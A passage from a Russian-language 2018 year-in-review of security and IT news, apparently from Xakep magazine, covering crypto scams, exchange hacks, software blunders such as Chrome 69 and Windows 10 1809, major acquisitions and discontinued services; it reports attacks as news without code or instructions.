  сайтов, и условия «раздачи криптовалюты» выглядели так же, как раньше: яко‐
  бы для верификации адреса пользователь должен отправить на указанный
  адрес от 0,1 до 3 BTC, а в ответ он получит в 10–30 раз больше.
    Самое грустное, что всего за один день мошенники получили поч‐
   ти 400 переводов и «зарабо тали» таким обра зом 28 биткойнов (при мер‐
  но 180 тысяч долларов по курсу на тот период).


                                        Продолжение статьи →
 ← Начало статьи





    Атаки на биржи
     Рассказывая о рисках и угро зах, свя занных с крип товалютами, нельзя не упо‐
     мянуть  множество  атак  на  криптовалютные  биржи,  имевших  место
     в 2018 году. Именно это — одна из главных причин, по которой эксперты
     крайне не рекомен дуют постоянно держать средс тва в кошельках бирж
     и обменников.
           Крупная японская биржа Coincheck сооб щила об ограблении, которое
Ян варь.
          может стать самым крупным инци дентом такого рода в истории. Зло‐
    умышленники похитили у компании криптовалю ту NEM (XEM) на сумму, пре‐
    вышающую 533 миллиона долларов по курсу на тот момент.
           От рук злоумышленников пострадала итальянская биржа BitGrail.
Февраль.
         С кошелька ресурса похитили более 17 миллионов монет Nano (XRB,
     ранее проект  носил имя  RaiBlocks),  что было  экви валентно пример‐
     но 180 миллионам дол ларов на момент публикации официального заявления
    об инциденте.
       В  Google  Play наш ли  фальшивое  приложение,  мас кировавшееся
Март.
         под официальное приложение одной из крупнейших криптовалютных
    бирж в мире — Poloniex. На самом деле никако го официального приложения
      у биржи не было. К счастью, подделка не успела начать собирать данные
     жертв, только переадресовывала пользователей на официальный сайт бир‐
     жи. Очевидно, ее авторы хотели сначала набрать базу лояльных пользовате‐
     лей.
       Мишенью для еще одной атаки ста ла еще одна биржа‐гигант —Binance.
Март.
         Эту атаку готовили несколько месяцев. В ходе ряда успешных фишин‐
     говых кампаний зло умышленники собрали учетные данные от аккаунтов мно‐
    жества пользователей. Для этого они в основном использовали поддельные
     домены, имитирующие настоящий домен Binance при помощи Unicode‐сим‐
     волов (так называемая омографическая ата ка). Получив доступ к массе чужих
     учетных записей, преступники не только про дали все альткойны своих жертв
     по рыночной стоимости и конвертирова ли их в бит койны, но стали скупать
     криптовалюту Viacoin (VIA), из‐за чего курс VIA стремительно пошел вверх,
     а объем торгов возрос с обычных 1–4 миллионов долларов  в день
    до 250 миллионов.
       Южнокорейскую биржу Coinrail можно наз вать сравнительно небольшой:
Июнь.
         она замыкает список топ‐100 по версии CoinMarketCap. В июне с сер‐
     веров компании были похищено порядка 30% всего альткойн‐портфеля бир‐
     жи, в частности ICO‐токены проектов Pundi X (NPXS), NPER (NPER) и Aston
      (ATX). Хотя представители Coinrail не назвали точную сумму, оказавшуюся
     в руках взломщиков, по данным СМИ, ущерб сос тавил порядка 40 миллиар‐
     дов вон, то есть около 37 миллионов долларов США.
       В 2017 году крупная биржа Bithumb уже подвергалась ком прометации.
Июнь.
          Тогда со счетов ресурса было похищено неизвестное количес тво Bitcoin
     и Ethereum. В этом году бир жу взло мали повторно. На этот раз неиз вестные
     похитили 35 миллиардов вон, то есть около 31 миллиона дол ларов в крип‐
     товалюте. По данным экспертов, за взло мом, воз можно, стояла известная
     северокорейская хакерская группировка  Lazarus (она же Hidden Cobra
     и BlueNoroﬀ).
        Децентрализованная криптовалютная платформа Bancor была вынуж‐
Июль.
         дена приостановить работу из‐за хакерской атаки. Неизвестные ском‐
     прометировали кошелек, использовавшийся для обновления смарт‐контрак‐
      тов. При этом проб лема не затронула пользователей платформы. Злоумыш‐
     ленникам удалось похитить более 12 миллионов долларов в ETH‐эквиваленте
      (24 984 ETH). Также было укра дено 229 356 645 NPXS (примерно миллион
     долларов на тот момент) и 3 200 000 BNT (около 10 миллионов долларов
     на тот момент).
            Японская криптовалютная бир жа Zaif, сущес твующая с 2014 года,
Сен тябрь.
              в результате ограбления лишилась 60 миллионов долларов. 14 сен‐
     тября атакующие опустошили горячие кошельки ресурса, похитив средс тва
     в трех криптовалю тах  (Bitcoin,  Bitcoin Cash и MonaCoin). Из похищен‐
     ных 6,7 миллиарда иен сама биржа вла дела лишь 32% средств (2,2 миллиар‐
     да иен), тогда как остальные 4,5 миллиарда принадлежали пользовате лям
     ресурса.
            Канадская биржа MapleChange сооб щила о взломе, произошедшем
Ок тябрь.
             из‐за некоего «бага». Разработчики заявили, что неизвес тные зло‐
    умышленники похитили все средства со счетов обменни ка. Вскоре пос ле это‐
     го все аккаунты MapleChange были уда лены (вклю чая аккаунты в Telegram
     и Discord), а в сооб щес тве поднялась паника. Пользователи заподозрили
     MapleChange в экзит‐ска ме, то есть попытке сбежать с деньгами клиентов.
    Позже представители MapleChange восста нови ли учетные записи и заявили,
     что отклю чили социальные сети временно, чтобы обдумать выход из сложив‐
    шейся ситуации. Также раз работчики отметили, что не смогут возместить
     убытки пострадавшим, но пообещали открыть кошельки с оставшимися
     средствами, чтобы люди могли попытаться вывести хотя бы что‐то. Сооб щес‐
     тво по‐прежнему подозревает руководс тво обменни ка в попытке экзит‐ска‐
     ма.
            Из‐за атаки тор говая платформа Trade.io лишилась 50 миллионов
Ок тябрь.
           собственных токенов платформы, Trade Token (TIO). Хакеры похитили
     токены с холодного кошелька проекта, и их стоимость по курсу на момент
     атаки составляла порядка 7,8 миллиона долларов. Как именно произошла
     атака, неясно. Дело в том, что предста вители плат формы уверяют, что соб‐
    людали все необ ходимые пра вила безопас ности при работе с холодным
     кошельком и пользовались защищенными банковскими ячей ками. Известно,
     что эти ячейки не были скомпрометирова ны.
          Взлом одного из крупнейших в мире сервисов веб‐аналитики Stat‐
Но ябрь.
             Counter, которым пользуются сотни тысяч сайтов, оказался связан
     с атакой на биржу Gate.io. Зло умышленники внедрили в скрипт StatCounter
     вредоносный  код, при помощи которо го получили возможность перех‐
     ватывать Bitcoin‐транзакции в веб‐интерфейсе биржи. С помощью видоизме‐
     ненного скрипта преступники подменяли любые Bitcoin‐адреса, введенные
     пользователями, на свои собственные, куда в итоге и уходили средства.
    Для каждой жертвы использовались разные адреса, и основной кошелек
     преступников вычислить не удалось.





 EPIC FAIL
    Ошибаются все, но далеко не всем уда ется признать и исправить свои ошиб‐
      ки, а также выйти из положения, сохранив лицо. И когда наблюдаешь за раз‐
     витием некоторых событий, их участникам хочется выдать медаль с надписью
     Epic fail или вознаградить их усилия утешительным «ты пытался». В этом раз‐
     деле мы собрали несколь ко самых выда ющихся «падений в лужу».





    Chrome 69
    Минувшей осенью разработчики бра узера Chrome подверглись настоящему
     шквалу критики. Дело в том, что в начале сентября 2018 года в свет вышел
    Chrome 69, который вызвал множество вопросов у ИБ‐спе циалис тов, СМИ
     и сообщества.
       К примеру, пользователям и специалис там не понравилось полное сок‐
     рытие WWW и поддоменов из адресной строки. Так разработчики браузера
    решили сделать интерфейс проще и удобнее, отказавшись от «сложных
     и ненужных» частей URL, которые лишь запутывают пользователей. По мне‐
    нию девелоперов, чтение URL‐адресов усложня ют отображающиеся в строке
     адреса мобильные поддомены, WWW и прочие элементы. В итоге возникла
     весьма странная ситуация. Так, если пользователь хотел посетить www.
     xakep.ru, то в адресной строке отображалось прос то xakep.ru. То же самое
     происходило с m.facebook.com, который превращал ся прос то в facebook.
     com.
      Подобное «упрощение» не понравилось многим само по себе, но вскоре
     обнаружилось множество багов, связанных с реализацией новой функци‐
     ональности. Например, конструкция www.example.www.example.com не дол‐
    жна превращаться в example.example.com, однако происходило именно это.
        Также в Chrome 69 появилась принудительная авторизация в браузере,
     которую многие эксперты сочли навяз чивой и вводящей в заблуждение. Ока‐
     залось, пользователей принудительно авторизуют в Chrome, если они вошли
     в свой аккаунт Google или любой дру гой сервис компании, например Gmail
     или YouTube. Для этого бра узер использовал механизм Sync. Нововведение
     вызвало тревогу, так как получалось, что Google имела воз можность свя зать
     трафик человека с конкретным бра узером и устройством.
       Кроме того, было замечено, что даже после получения команды на уда‐
     ление всех файлов cookie, куки для сервисов Google из Chrome 69 не уда‐
     ляются до тех пор, пока пользователь не раз логинит ся и не повторит эту про‐
     цедуру. В противном случае браузер удалит фай лы, но тут же вос создаст их
     снова для поддержания авторизации.
      В  итоге  инженеры  Google  были  вынуж дены  обратить  вни мание
     на недовольство сооб щества: с релизом Chrome 70 (октябрь 2018 года) они
     пересмотре ли некото рые внесенные в код изменения.
      В браузер добавили нас тройку Allow Chrome sign‐in («Раз решить вход
     в Chrome»), с помощью которой можно регулировать автоматический вход
     в браузер и его зависимость от авто ризации в дру гих сервисах Google. Также
    был доработан UI, появились более понятные инди каторы, которые помогают
     понять, когда вход в браузер выполнен и когда вклю чена или отключена син‐
     хронизация. Кроме того, Chrome 70 стал корректно удалять все файлы cookie,
     не делая исклю чений для сервисов самой Google. Проблема исключения
     из адресной строй ки WWW и мобильных поддоменов тоже разрешилась
    похожим образом, но лишь временно. Разработ чики решили пока отме нить
     внесенные изменения и отпра вили функциональность на доработку.





    Windows 10 1809
    Октябрьское обновление 2018 года для Windows 10 (Windows 10 1809, оно же
     Windows 10 October Update) определен но войдет в историю как одно
     из наиболее проблемных.
      В октябре, сразу вскоре пос ле релиза обновления, обнаружилось, что
     в некоторых случаях оно уда ляет файлы из папок с документами и картинка‐
     ми. Пользователи жалова лись на исчезновение сотен гигабайт данных.
     Как оказалось, проб лема была связана с OneDrive: если файлы отсутству ют
     в облачном хранилище, но присутству ют в директории users\User, то пос ле
     установки обновления они могут быть «потеряны». По данным Microsoft,
    проблема коснулась лишь примерно 0,01% пользователей, но распростра‐
     нение апдейта были приостановлено.
       К сожалению, удаление файлов ока залось далеко не единственной проб‐
    лемой 1809. После того как обновление переработали и выпустили снова (на
     этот раз только для участников программы Microsoft Insider), выяснилось, что
     оно провоцирует BSOD на компьютерах и ноутбуках производства HP.
       Затем владельцы некоторых систем обна ружи ли, что у них пропал звук
     и появилось лаконичное сооб щение «Аудиоус тройство не установлено».
    При этом на машине мог ли использовать ся абсолютно любые аудиодрай‐
    веры (Realtek, Intel и так далее). Как оказалось, причиной были некорректные
     драйверы, распространившиеся через Windows Update.
       Вскоре в 1809 нашли еще одну проб лему, свя занную со встроенной фун‐
     кциональностью ОС и рас паковкой архивов ZIP. В нормальных обстоятель‐
     ствах при распаковке архива операционная система спрашивает у поль‐
     зователя, нужно ли перезаписать сущес твующие файлы, если в указанной
     директории уже содержится данный контент. Однако 1809 не спрашивала
     некоторых пользователей ни о чем подоб ном. При попытке распаковать
     архив (или перетащить один из файлов архива в новое мес то) туда, где уже
    существуют те же самые файлы, ОС попросту перезаписы вала их без всяких
     предупреждений.
       Заметили неч то странное и раз работчики: после релиза 1809 возникла
    проблема с приложениями UWP (Universal Windows Platform, универсальная
     платформа Windows) — они попросту «ломались». Корень бага скрывался
     в API broadFileSystemAccess, который мог оши бочно выдавать приложениям
    UWP доступ ко всем пользовательским фай лам, документам, фото и даже
    файлам, хранящимся в OneDrive. В нормальных обстоятельствах приложения
    UWP должны быть ограничены определен ными директориями (Temp, AppDa‐
      ta\Local, AppData\Roaming и директорией самого приложения), а разработ‐
     чики могут лишь запросить у пользователя дополнительный дос туп к другим
     локациям. Однако в версии 1809 раз решение пользователя не требовалось,
     и broadFileSystemAccess мог автомати чес ки использоваться для дос тупа
     ко всей файловой системе.
      В конце ноября 2018 года была представлена новая, в оче редной раз
     переработанная вер сия 1809. Раз работчики Microsoft потратили на исправ‐
     ление многочисленных багов больше месяца, но, увы, лишь привнесли в код
     новые изъяны.
       Например, в перевыпущенной версии 1809 наблюдаются проблемы
     с сетевыми дисками — к ним попросту невоз можно подключиться, и баг
    пообещали устранить лишь в 2019 году. Также апдейт пока не получат и вла‐
     дельцы видеокарт Radeon HD 2XXX и 4XXX: у них наблюдаются серьезные
    проблемы с производитель ностью, а бра узер Edge может демонс трировать
    ошибки. Кроме  того, возникли проблемы с совмести мостью с такими
    решениями Trend Micro, как OﬃceScan и Worry‐Free Business Security.
        Хуже того, обновленная версия 1809 ока залась нес пособна нормально
     работать с iCloud и VPN компании F5 Network. Из‐за этого распространение
     обновления вновь было временно остановлено для пользователей iCloud
     для Windows версии 7.7.0.27, а пользователям с уже обновленной ОС просто
     не давали установить эту версию iCloud (они видели ошиб ку, сообщающую,
     что их ОС слишком новая). В нас тоящий момент проблему с iCloud испра‐
     вили, но, похоже, злоключения пользователей Windows 10 1809 на этом
     не закончились. Продолжим следить за ситуацией в 2019 году. :)





    «Невзламываемый» кошелек Макафи
    Одной из самых нелепых и смешных историй про шедшего года определенно
     стала рекламная кампания криптовалютного кошелька  Bitﬁ, которую раз‐
     вернул в сети небезызвестный Джон Макафи.
      В начале августа 2018 года Макафи предложил всем желающим поп‐
     робовать хакнуть криптовалютный кошелек Bitﬁ, называя устройство «невзла‐
    мываемым» и предлагая 250 тысяч долларов любому, кто сумеет доказать
     обратное. ИБ‐сооб щество рас критиковало Макафи, заявив, что он поставил
     очень странные «усло вия задачи», из‐за которых может сколь угодно дол го
     утверждать, что Bitﬁ никто не взло мал. Так, исследователям пред ложили при‐
     обрести устройство за 120 долларов США. При этом кошелек уже содержит
     криптовалюту с неизвес тной парольной фразой. Требовалось извлечь токены
     с устройства, и лишь пос ле это го оно должно было считаться взломанным.
    При этом ключ, использующийся для доступа к криптовалюте, не хранится
     на самом устройстве.
       Эксперты быстро выяс нили, что «невзламыва емое» устройство представ‐
     ляет собой смартфон на Android, из которого уда лили часть компонентов (в
     основном отвечающих непос редственно за сотовую связь). Специалистам
     удалось получить к девайсу root‐доступ и обна ружить, что тачскрин сооб‐
    щается с чипсетом посредством незашифрованного протокола I2C. То есть
     в теории злоумышленники могут «прос лушивать» эти коммуникации и извлечь
     парольную фразу сразу же после того, как она была набрана на экране. Хуже
      того, кошельки оказались практически никак не защищены от несанкциони‐
     рованного вмешательства. То есть Bitﬁ можно было вскрыть и иссле довать,
     а он продолжал работать как ни в чем не бывало.
      И хотя Макафи стоял на своем (день ги не похищены? Кошелек не взло‐
      ман!), исследователи развлекались как могли — на устрой стве удалось даже
     запустить Doom. Для это го потребовалось установить и выполнить про‐
     извольный код, а также реализовать чтение и запись из хранилища и RAM,
     запись в кадровый буфер и чтение данных с тачскрина.





    После этого Джон Макафи все же признался в интервью, что называть Bitﬁ
    именно словом «невзламыва емый» было неразумно. Впрочем, он все равно
    был убежден, что кошелек не может считаться взломанным, и подчеркнул, что
     под «взломом» подразумевалось имен но хищение токенов и ничего более.
     Также Макафи не преминул напомнить, что все, что он делает, — это лишь
    маркетинг.
      В итоге 15‐летний исследова тель Салим Рашид (Saleem Rashid) (именно
     он запустил Doom на устройстве) опуб ликовал у себя в Twitter видео, где про‐
    демонстрировал получение парольной фразы и соли — двух элементов,
     необходимых для генерации приватного ключа, которым защищены средства.
     Локальный эксплоит позволил извлечь ключи с устрой ства.
       Рашид и его кол лега Райан Кастеллуччи (Ryan Castellucci) объяснили, что
     применили к кошельку ата ку cold boot (ата ку методом холодной перезаг‐
      рузки). Как оказалось, получение root‐доступа к устройству не пол ностью очи‐
    щало RAM, а Bitﬁ хранил ключи в памяти дольше, чем заявляли его разработ‐
      чики. В результате эксплуатация проблемы заняла менее двух минут, и дан‐
    ный метод не тре бовал даже какого‐либо специфического оборудования.
       Вскоре после публикации PoC‐видео и доказа тельства взлома Bitﬁ раз‐
     работчики крип товалютного кошелька опубликовали в своем официальном
     микроблоге сообщение, не на шутку разоз лившее ИБ‐сооб щес тво. Авторы
      Bitﬁ сообщили, что наняли некоего «опытного специалис та по информацион‐
     ной безопасности», который подтвердил наличие уязвимостей, обнаружен‐
     ных исследователями. Также разработ чики пообещали исправить проблемы
     в кратчайшие сроки. В коммента риях к этой записи специалисты со всего
    мира интересовались, каким же обра зом команда Bitﬁ намере на исправлять
     уязвимости, для которых, скорее всего, нужно менять аппаратную начинку
     устройства.
       Кроме того, в заявлении сообщалось, что программа bug bounty, которая
     «вызывала понятный гнев и раздра жение со стороны иссле дователей»,
    немедленно закрывается. Обещанное воз награждение в раз мере 250 тысяч
     долларов не было выплачено Рашиду и Кас теллуччи или кому‐либо другому.
    Вместо этого разработчики поб лагода рили экспертов за труды и пообещали
     запустить новую программу воз награждений за уяз вимости на платформе
     Hacker One.
      И наконец, создатели Bitﬁ согласились убрать слово «невзламываемый»
     из описаний своего продукта, так как оно и некоторые «другие действия» ком‐
     пании оказывали контрпро дуктивное воздей ствие на ситуацию.
       За столь впечатляющее неумение справлять ся с уязвимостями и при‐
     нимать критику разработчики Bitﬁ удостоились премии Pwnie.


                                            Продолжение статьи →
← Начало статьи





  Об новле ния CCleaner
   В прошлом году компанию Piriform, разрабатывающую популярнейшую ути‐
    литу CCleaner, предназна ченную для очистки и оптимизации ОС семей ства
   Windows, приобрела компания Avast. Пос ле этого раз личные неприятные
   изменения в работе CCleaner происходят с завидной регулярностью. Нап‐
   ример, вышедшая в мае текущего года версия CCleaner 5.43 лишила поль‐
   зователей бесплатной версии возможности отказаться от обмена данными.
   Версия CCleaner 5.44, вышедшая в июне, обза велась всплывающей рек‐
   ламой. А затем появилась CCleaner 5.45, где ока залось нельзя отказаться
   от активного монито рин га и сложно было даже завершить саму работу прог‐
   раммы.
     В отличие от предыдущих версий 5.45 попросту не имела соответству‐
   ющих настроек приватности, позволяющих избавить ся от этого обезличен‐
   ного сбора данных. И хотя у пользователей все же оставалась возможность
   открыть настройки и там отка заться от системного и активного мониторинга,
    те снова включались уже при следующем запус ке программы (разуме ется,
   без спроса).
      Хуже того, даже закрыть новую версию CCleaner оказалось непросто.
   Программа сворачивалась в область уведомлений, а ее иконка никак
   не помогала прер вать работу. Фактически единс твенным способом закрытия
   CCleaner стала принудительная ликвидация через «Диспетчер задач».
     После  того  как странное поведение CCleaner  5.45 раскритиковали
   не только пользователи, но и ИБ‐специалисты и отраслевые СМИ, разработ‐
   чики решили прислушать ся к общественному мнению. Было при нято решение
   вернуться к версии 5.44, которая снова стала самой «свежей» из всех дос‐
   тупных для загрузки. Разработчики пообещали, что доработают новую версию
   и в ней появится возможность завершения работы программы. Также обе‐
   щали, что клининговая функциональность будет четко отделена от аналити‐
   ческой, а для управления ими добавятся соответствующие настройки,
   которые CCleaner будет запоминать (в том числе пос ле закрытия).
     Но вскоре у пользователей CCleaner появился новый повод для воз‐
   мущений. Спустя всего месяц после неудачного релиза и отката вер‐
   сии 5.45 утилита стала самопроизвольно обновляться до версии 5.46, нев‐
   зирая на заданные настройки обновления (то есть даже если автообновле ние
   было отключено). Более того, ока залось, что пос ле перехода на новую вер‐
   сию все настройки программы сбрасываются к значени ям по умолчанию, то
   есть активируется сбор и использование анонимных данных о пользователе
   в пользу Avast и Piriform.
     В Piriform объяснили, что с релизом версии 5.46 разработчики принуди‐
   тельно перевели некоторых пользователей на данную версию, чтобы удов‐
   летворить некие «закон ные требования» и предоставить пользовате лям
   большую анонимность и проз рачность в вопросах приватности.
     Представите ли Avast, в свою очередь, заявили, что обновление до вер‐
   сии 5.46 является критичес ким и призвано защитить пользователей от неких
   угроз безопасности и потери данных, которая, например, может произой ти
   в ходе софтверного или аппа ратного конфликта. В компании заверили, что
   переход на CCleaner 5.46 не имеет ничего общего с механизмом автомати‐
   ческого   обновления,   который   пользователи   CCleaner   Professional
   при желании могут отклю чить (а пользователи бесплатной версии вообще
   не имеют).
     Сообщалось, что CCleaner 5.46 яко бы раз реша ет некие проблемы со ста‐
   бильностью и защищает пользователей Windows от возникновения неполадок
    (к примеру, потери личных данных в Chrome или потенциальных проблем
   с драйверами после обновления ОС). Также в новой версии было улучшено
   управление настрой ками приватности, и она лучше отве чает требованиям
   GDPR.
     Кроме того, разработ чики утверждали, что в ходе обновления нас тройки
   приватности не сбрасываются до значений по умолчанию, а происходящие
   в настройках изменения они объяснили вступлением в силу GDPR и кри тикой
   со стороны сообщества (в частности, полученной после релиза проблемной
   версии 5.45). То есть утвержда лось, что изменились сами настрой ки и их
    структура и поэтому пос ле обновления пользователи увидели совсем иную
   картину.
     При этом многие представители ИБ‐сооб щества продолжают нас таивать
   на том, что компания подчеркнуто игно риру ет предпочтения пользователей
   и насильно навязывает им обновления.





 КРУПНЫЕ СЛИЯНИЯ
   В этом году произошло сра зу нес колько резонансных слияний, которым мы
   просто не могли не уделить внимания, подводя итоги года.





  TRON и BitTorrent
   Летом 2018 года стало извес тно, что компания TRON Foundation, основате‐
   лем которой является известный блокчейн‐предпри ниматель и создатель
   криптовалюты Tron Джастин Сан (Justin Sun), при обрела компанию BitTorrent
     Inc.,  разрабатывающую  популярнейшие  клиенты  μTorrent  и  BitTorrent.
   По неофициальным данным, стоимость сделки сос тавила 120 миллионов
   долларов США (изначально сообщалось о 140 миллионах, но эту информа‐
   цию опроверг бывший глава BitTorrent Ашвин Навин).
     Джастин Сан и разработчики TRON официально рассказали о дальнейших
   планах относительно BitTorrent и ее продуктов. Компания не станет изме нять
   свою бизнес‐модель, заниматься майнин гом, а торрент‐клиенты  точно
   не станут платными, и их раз работка будет продолжена.
     Кроме того, в официальном блоге TRON был анонсирован «секретный
   проект» Atlas, который должен объеди нить TRON и BitTorrent, что, как ожи‐
   дается, должно пой ти на пользу обо им:



         «В нас тоящее вре мя мы рас сматрива ем воз можность использования
         протокола TRON для улуч шения протокола BitTorrent, чтобы тот стал
         быс трее и прод лял  срок жиз ни  BitTorrent-роев. Я  наде юсь,  что
          интегра ция TRON и BitTorrent в будущем поз волит обе им сторонам
          работать сов мес тно и стать луч ше, — пишет Сан. — Интегрируя TRON
         и  BitTorrent, мы хотим улуч шить сущес тву ющий сейчас альтру изм.
        В нас тоящий момент у пиров [peer], которые завер шили загрузку, нет
          стимулов продолжать сидировать [seed] контент.
         Мы намере ны уве личить награду для пиров, которые сидиру ют тор-
          ренты, вливая больше ресур сов в тор рент‑эко сис тему.
         Сеть TRON будет протоколом, который ляжет в основу нашего сек-
          ретного проекта. Сотни миллионов пользовате лей BT по все му миру
          ста нут частью эко сис темы TRON.
           BT ста нет круп нейшим приложе нием в сети TRON, что поз волит
        TRON прев зойти Ethereum по ежед невным транзакциям и стать наибо-
         лее влиятельным блок чейном в мире».

   В открытом письме Сан подчеркнул, что интегрировать в продукцию BitTorrent
    что‐либо, связанное с майнин гом, не планируется и все эти нововведения
   не скажутся на поль зователях негативным обра зом.
     В настоящее время известно, что пользователи BitTorrent и μTorrent смогут
   оплачивать пре миальные продукты торрент‐клиентов с помощью  крип‐
   товалют Bitcoin (BTC), Binance Coin (BNB) и TRON (TRX). Поощрять поль‐
   зователей будут с помощью токенов TRX. BitTorrent подключит пиринговую
   сеть к блокчейну TRON, за токены можно будет при обрести специальные
    услуги и дополнительные опции (например, увеличенную скорость загрузки),
   а авторы контента смогут вознаграждать токена ми сидеров.





   Microsoft и GitHub
   Компания Microsoft приобрела круп ней ший хос тинг репозиториев GitHub
   за 7,5 миллиарда дол ларов. Многих пользователей сдел ка не на шутку встре‐
   вожила, и в Сети даже появились петиции против слияния, а операторы Git‐
    Lab, BitBucket и SourceForge сообщили о значительном прирос те трафика —
   разработчики тысячами перемещали свои проекты на другие хостинги.
     Представите ли Microsoft заверили, что осоз нают всю ответственность
   перед сообществом разработ чиков, практичес ки не собираются вмешивать‐
   ся в работу GitHub, он продолжит независимое существование и по‐преж‐
   нему останется пол ностью открытым и бесплат ным.
     Новый CEO GitHub Нэт Фридман (Nat Friedman) заявил, что «Microsoft
   покупает GitHub, потому что ей нра вится GitHub», а также подчеркнул, что
   компания стремится лишь к тому, что бы «GitHub стал еще лучше».





   IBM и Red Hat
   Осенью 2018 года о гря дущем слиянии объявили компании IBM и Red Hat.
   Сумма сделки составит порядка 34 миллиардов долларов США, то есть IBM
   готова заплатить 190 долларов США за одну акцию Red Hat, хотя сейчас
   капитализация компании оценивается в 20,5 миллиарда долларов. Сдел ка
   уже одобрена руководством обеих компаний.
     После завершения сделки (это должно произойти во второй полови‐
   не 2019 года) Red Hat сохранит свою структуру и продол жит работать
    как отдельное подразделение IBM, которое, в свою очередь, войдет в сос тав
   подразделения Hybrid Cloud. Red Hat продолжит раз работку своих опенсор‐
   сных решений и работу над открытыми про ектами, в которых участву ет.
     В IBM считают, что пог лощение Red Hat выведет компанию на новый уро‐
   вень и изменит ситуацию на рынке облачных технологий. Как пишет генераль‐
   ный директор IBM Джинни Ромет ти (Ginni Rometty), после завершения сдел ки
   компания станет крупнейшим в мире поставщиком в области гибридных
   облачных технологий.
     В свою очередь, руководство Red Hat убеж дено, что присоединение к IBM
   поспособствует росту влияния открытого ПО и поможет донести продукцию
   Red Hat до большего числа людей.





 ИНТЕРНЕТ, КОТОРЫЙ
 МЫ ПОТЕРЯЛИ
   В интернете постоянно появляются новые сайты, сервисы, платформы
   и целые социальные сети. Дру гие, напротив, «ухо дят на покой» или пол‐
   ностью меняют свой формат. В 2018 году мы лишились сразу нескольких
   крупных проектов и решений, о которых вспомним ниже.


   SkyTorrents
   Появившийся в прошлом году «пират ский» трекер SkyTorrents обещал, что
   «сайт навсегда останется свободным от рекламы или будет закрыт». Ресурс
   очень быстро дошел до той стадии, ког да стал привлекать несколько мил‐
   лионов посетителей в день, трафик рез ко воз рос, а вместе с ним увеличились
   и расходы на содержание. Администра торы трекера остались верны своим
   убеждениям, гласив шим, что реклама компро метирует приватность поль‐
   зователей. Они попытались собирать пожертво вания, это не слишком помог‐
    ло. В итоге трекер ушел в офлайн, но оста вил пос ле себя гигантскую базу,
   насчитывающую око ло 15 миллионов торрентов. Команда SkyTorrents вырази‐
   ла надежду, что кто‐нибудь продолжит их дело и, воспользовавшись базой
   ресурса, возродит трекер, развивая дальше идею свободного от рекламы
   «пиратского» пространства.


   Tor Messenger
   Разработчики Tor Project прекратили разработку анонимного мессендже ра
    Tor Messenger, который был представлен в 2015 году. В блоге команды были
   названы три основные причины прекращения раз работки:
    1. Tor Messenger был пос троен на базе клиента  Instantbird, разработку
   которого остановили в 2017 году.
    2. Проблема метаданных, которые сохраняются на сторонних серверах, ока‐
   залась более значительной, чем предполагалось изначально. Разработчики
    Tor Messenger ничего не могли с этим поделать.
    3. У команды попросту не хватило ресурсов. Даже пос ле 11 выпущенных вер‐
   сий Tor Messenger по‐прежнему находился на ста дии бета‐тестирования
   и никогда не про ходил внешний аудит (только два внут ренних).


   Goo.gl
   Прекратил свою работу сервис для сокращения ссылок goo.gl, запущенный
   в далеком 2009 году. Разработчики объяснили, что с тех пор утекло много
   воды, на рынке появилось множество аналогичных проектов, а потом мобиль‐
   ные устройства, голосовые ассистенты и приложения вооб ще изме нили
   интернет до неузнаваемос ти. По мнению инженеров Google, в настоящее
   время в сервисе для сокращения ссы лок более нет нужды. Консоль goo.gl
   будет доступна зарегистрированным пользователям, уже имеющим короткие
   ссылки, до 30 марта 2019 года. По истечении этого срока существу ющие
   ссылки продолжат перенаправлять поль зователей по нужным адресам, одна‐
   ко доступ к консоли и добавление новых URL будут закрыты.


   Се риализация Java
   Разработчики Oracle решили отказаться от поддержки функциональности
   сериализации и десериализации данных в языке Java. Главный архитектор
   платформы Java Марк Рейнхолд (Mark Reinhold) откры то назвал добавление
   поддержки сериализации в Java в 1997 году «ужас ной ошибкой». По его мне‐
   нию, больше трети всех уязвимос тей Java были так или иначе связаны с этой
   функциональностью. В настоящее время, в рамках проекта Amber, инженеры
   Oracle работают над  отка зом  от встроенной поддержки сери ализации
   в основном теле языка. Обещают, что при необходимости у девелоперов
   останется возможность пользоваться операциями сери ализации при помощи
   нового фреймвор ка.


   Сайты со старыми ROM’ами
   Компания Nintendo начала юридичес ки бороть ся с сайтами, распростра‐
   няющими ROM’ы старых игр. Предста вители компании обратились в суд
   с жалобой на ресурсы LoveROMS.com и LoveRETRO.co, обвинив их в наруше‐
   нии авторских прав и незаконном использовании торговых марок. Вскоре оба
   ресурса ушли в офлайн, а за ними последовал еще один крупный и известный
   сайт — Emuparadise.me, рас простра нявший старые ROM’ы более восем‐
   надцати лет. Спустя нес колько месяцев ста ло известно, что владельцы
   LoveROMS и LoveRETRO решили не пытаться противос тоять Nintendo в пра‐
   вовом поле, и стороны урегулирова ли вопрос мировым соглашением, а также
   бессрочным судебным запретом. Операторы сай тов признали все обвинения
   в свой адрес и обязались выплатить компании 12,23 миллиона дол ларов,
   отдать домены, а также никогда не нарушать авторских прав Nintendo впредь.


   Google+
   Компания Google приняла решение закрыть Google+ в апре ле 2019 года.
   Одной из главных причин для этого стала общая непопулярность проекта.
   Попытка создать собственную социальную сеть опре деленно окончилась
   неудачей, так как даже согласно официальной статис тике вовлеченность
   пользователей стремится к нулю: 90% сес сий длятся менее пяти секунд. Хуже
    того, в API Google+ были найдены две уяз вимос ти, одна из которых существо‐
   вала в коде с 2015 по 2018 год. Баги могли привес ти к утечке личных данных
   более 500 тысяч пользователей, хотя в компании уве ряют, что нет никаких
   свидетельств того, что уяз вимос тями действительно кто‐то пользовался.


   Google Allo и Hangouts
   Мессенджер  Allo  с  end‐to‐end‐шифрованием,  представленный  Google
   в 2016 году, будет закрыт в марте 2019 года. Проект, отличавшийся встро‐
   енной интеграцией с «умным» голосовым ассистентом Google Assistant, так
   и не нашел свою аудиторию.
   Такая же судьба постигла и более долгоиграющий проект Google, мессен‐
   джер Hangouts, некогда объединивший в себе Google Talk, Google+ Messen‐
    ger, а также часть Google+, которая позволяла создавать групповые виде‐
   оконференции на десять человек. Точная дата ликвидации мессенджера пока
   неизвестна, а пользователей должны перевес ти на корпоративные решения
   Hangouts Chat и Hangouts Meet.


   Бо нус: Winamp
   Завершим эту подборку на хорошей ноте и вспомним о программе, неожи‐
   данно «восставшей из мертвых». Осенью раз работчики Winamp внезапно
   анонсировали,  что  леген дарный  медиаплеер,  который  не  обновлял ся
   с 2013 года, вер нется в 2019 году с новой версией. Переработанный Winamp
   обещает стать универ сальным решением для прос лушивания всего — под‐
    кастов, радио, плейлистов и многого другого.


  МАК СИМАЛЬНО КОРОТКО
    За год произошло немало событий, которым не дос талось пол ноценного места в нашем отчете.
